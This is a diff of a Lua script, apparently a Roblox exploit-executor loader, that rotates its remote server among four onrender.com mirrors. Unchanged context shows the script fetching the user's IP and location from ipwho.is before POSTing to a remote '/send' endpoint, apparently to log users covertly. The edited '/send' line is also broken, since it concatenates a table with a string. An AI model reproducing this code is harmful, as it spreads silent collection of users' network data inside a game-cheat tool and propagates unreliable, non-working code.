@@ -1,8 +1,15 @@
+_G.MirrorLinks = {
+	[1] = "https://mirrorr.onrender.com",
+	[2] = "https://mirrorr2.onrender.com",
+	[3] = "https://mirror3-0wh0.onrender.com",
+	[4] = "https://mirrorr4.onrender.com"
+}
+
 getgenv().loadmirror = function(Link)
 	local request = request or syn and syn.request or http and http.request
 	local HttpService = game:GetService("HttpService")
 	local message = request({
-		Url = "https://mirrorr.onrender.com/mirror",
+		Url = _G.MirrorLinks[math.random(1, 4)].."/mirror",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -21,7 +28,7 @@ getgenv().mirror = function(Link)
 	local request = request or syn and syn.request or http and http.request
 	local HttpService = game:GetService("HttpService")
 	local message = request({
-		Url = "https://mirrorr.onrender.com/mirror",
+		Url = _G.MirrorLinks[math.random(1, 4)].."/mirror",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
@@ -84,7 +91,7 @@ if (writefile) and (getcustomasset) then
 	local WhoIs = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
 	coroutine.wrap(function()
 		local message = request({
-			Url = "https://mirrorr.onrender.com/send",
+			Url = _G.MirrorLinks.."/send",
 			Method = "POST",
 			Headers = {
 				["Content-Type"] = "application/json"
